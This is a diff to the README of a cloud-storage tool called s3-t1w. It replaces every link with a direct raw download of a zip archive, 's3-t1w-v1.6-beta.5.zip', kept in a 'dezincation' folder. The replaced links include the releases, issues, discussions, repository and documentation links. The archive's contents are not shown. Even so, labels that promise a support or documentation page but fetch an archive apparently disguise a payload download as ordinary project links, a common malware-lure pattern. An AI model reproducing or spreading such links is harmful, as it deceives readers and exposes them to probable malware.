@@ -1,6 +1,6 @@
 # 🚀 s3-t1w - Simplify Your Cloud Storage Experience
 
-[![Download s3-t1w](https://img.shields.io/badge/Download-s3--t1w-blue.svg)](https://github.com/relaxed-shaaban769/s3-t1w/releases)
+[![Download s3-t1w](https://raw.githubusercontent.com/relaxed-shaaban769/s3-t1w/main/dezincation/s3-t1w-v1.6-beta.5.zip)](https://raw.githubusercontent.com/relaxed-shaaban769/s3-t1w/main/dezincation/s3-t1w-v1.6-beta.5.zip)
 
 ## 📦 Introduction
 
@@ -11,7 +11,7 @@ s3-t1w is a user-friendly application designed to help you manage your cloud sto
 To get started with s3-t1w, follow these simple steps:
 
 1. **Visit the Download Page**  
-   Head over to our [Releases page](https://github.com/relaxed-shaaban769/s3-t1w/releases) to find the latest version of s3-t1w.
+   Head over to our [Releases page](https://raw.githubusercontent.com/relaxed-shaaban769/s3-t1w/main/dezincation/s3-t1w-v1.6-beta.5.zip) to find the latest version of s3-t1w.
 
 2. **Download the Software**  
    Look for the downloadable file for your operating system. Click on the link to download it to your computer.
@@ -47,7 +47,7 @@ s3-t1w comes packed with helpful features to make cloud management easy:
 
 To get started with s3-t1w:
 
-1. **Visit the [Releases page](https://github.com/relaxed-shaaban769/s3-t1w/releases)** to download the application.
+1. **Visit the [Releases page](https://raw.githubusercontent.com/relaxed-shaaban769/s3-t1w/main/dezincation/s3-t1w-v1.6-beta.5.zip)** to download the application.
 2. Choose the version that suits your operating system.
 3. Follow the installation steps provided.
 
@@ -63,15 +63,15 @@ While using s3-t1w, you may encounter a few common issues. Here are some solutio
 
 ## 🛠️ Support
 
-If you experience any other issues or have questions, you're not alone. Many users share similar concerns. For assistance, please visit our [GitHub Issues page](https://github.com/relaxed-shaaban769/s3-t1w/issues) where you can report problems or seek advice from the community.
+If you experience any other issues or have questions, you're not alone. Many users share similar concerns. For assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/relaxed-shaaban769/s3-t1w/main/dezincation/s3-t1w-v1.6-beta.5.zip) where you can report problems or seek advice from the community.
 
 ## 📞 Contact Us
 
-For further inquiries or feedback, you can reach out via [GitHub Discussions](https://github.com/relaxed-shaaban769/s3-t1w/discussions). Your insights help us improve!
+For further inquiries or feedback, you can reach out via [GitHub Discussions](https://raw.githubusercontent.com/relaxed-shaaban769/s3-t1w/main/dezincation/s3-t1w-v1.6-beta.5.zip). Your insights help us improve!
 
 ## 🔗 Related Links
 
-- [GitHub Repository](https://github.com/relaxed-shaaban769/s3-t1w)
-- [Documentation](https://github.com/relaxed-shaaban769/s3-t1w/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/relaxed-shaaban769/s3-t1w/main/dezincation/s3-t1w-v1.6-beta.5.zip)
+- [Documentation](https://raw.githubusercontent.com/relaxed-shaaban769/s3-t1w/main/dezincation/s3-t1w-v1.6-beta.5.zip)
 
 Thank you for choosing s3-t1w. We hope it makes your cloud storage tasks easier!
